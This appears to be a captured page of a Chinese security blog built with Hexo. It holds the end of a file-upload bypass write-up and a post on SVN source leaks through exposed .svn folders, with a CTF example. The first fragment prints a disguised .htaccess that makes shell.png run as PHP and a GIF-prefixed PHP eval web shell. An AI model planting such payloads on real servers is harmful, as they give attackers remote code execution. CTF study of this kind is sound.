+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#define width 1</span><br><span class="line">#define height 1</span><br><span class="line">&lt;FilesMatch &quot;shell.png&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>上传shell.png</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?= eval($_POST[&#x27;whb&#x27;]);?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-SVN漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/04/01/SVN%E6%BC%8F%E6%B4%9E/" class="article-date">
+  	<time datetime="2025-04-01T11:31:46.797Z" itemprop="datePublished">2025-04-01</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="SVN漏洞"><a href="#SVN漏洞" class="headerlink" title="SVN漏洞"></a>SVN漏洞</h1><p>[TOC]</p>
+<h2 id="一、SVN概述"><a href="#一、SVN概述" class="headerlink" title="一、SVN概述"></a>一、SVN概述</h2><p>​        SVN(全称subVersion) ，又叫版本控制软件。使用SVN可以多人协作开发：如张三、李四各自负责不同的模块；远程开发：如张三、李四在不同的城市一起负责统一项目的开发；版本回退：如项目迭代后发现还是原来的版本更欢迎，于是乎回退到原来的版本 。</p>
+<p>​        如果张三、李四两个人对同一个项目代码进行了改动，SVN会对两个人修改部分进行合并，如果都是修改的同一行，SVN 会提示文件 Conflict 冲突，需要手动确认。</p>
+<p>​    SVN属于C&#x2F;S结构软件（<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%AE%A2%E6%88%B7%E7%AB%AF&spm=1001.2101.3001.7020">客户端</a>&#x2F;服务端）</p>
+<p>二、漏洞简介</p>
+<p>​         SVN（subversion）是程序员常用的源代码版本管理软件。在使用 SVN 管理本地代码过程中，使用 svn checkout 功能来更新代码时，项目目录下会自动生成隐藏的.svn文件夹（Linux上用 ls 命令看不到，要用 ls -al 命令），其中包含重要的源代码信息。</p>
+<p>​        造成SVN源代码漏洞的主要原因是管理员操作不规范，一些网站管理员在发布代码时，不愿意使用“导出”功能，而是直接复制代码文件夹到WEB服务器上，这就使得.svn隐藏文件夹被暴露于外网环境，黑客对此可进一步利用：</p>
+<p>​         可以利用其中包含的用于版本信息追踪的 entries 文件（.svn&#x2F;entries 文件），获取到服务器源码、svn服务器账号密码等信息；<br>可以利用 wc.db 数据库文件（.svn&#x2F;wc.db 文件），获取到一些数据库信息；<br>​           更严重的问题在于，SVN产生的.svn目录下还包含了以.svn-base结尾的源代码文件副本（低版本SVN具体路径为text-base目录，高版本SVN为pristine目录），如果服务器没有对此类后缀做解析，则可以直接获得文件源代码。<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/109306693">https://blog.csdn.net/weixin_39190897/article/details/109306693</a></p>
+<p>三、漏洞检测</p>
+<p>1、最简单的检测方法是直接在网站路径后面 + <code>/.svn/entries</code>，存在漏洞会显示数字“12”</p>
+<p>2、实际工作过程中，可以使用 dirsearch 进行路径扫描：</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/a617af9619c5791295e4c760102093ce.png#pic_center" alt="img"></p>
+<p>3、下载并分析 wc.db 文件：</p>
+<h4 id="eg-1"><a href="#eg-1" class="headerlink" title="eg.1"></a>eg.1</h4><p><img src="/SVN%E6%BC%8F%E6%B4%9E/image-20250510192632768.png" alt="image-20250510192632768"></p>
+<p><img src="/SVN%E6%BC%8F%E6%B4%9E/image-20250510192759257.png" alt="image-20250510192759257"></p>
+<p>点进去57 再点就能看到flag</p>
+<p><img src="/SVN%E6%BC%8F%E6%B4%9E/image-20250510192837113.png" alt="image-20250510192837113"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
+    </nav>
+  
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2025 zhangsuhong
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: true,
+		isPost: false,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
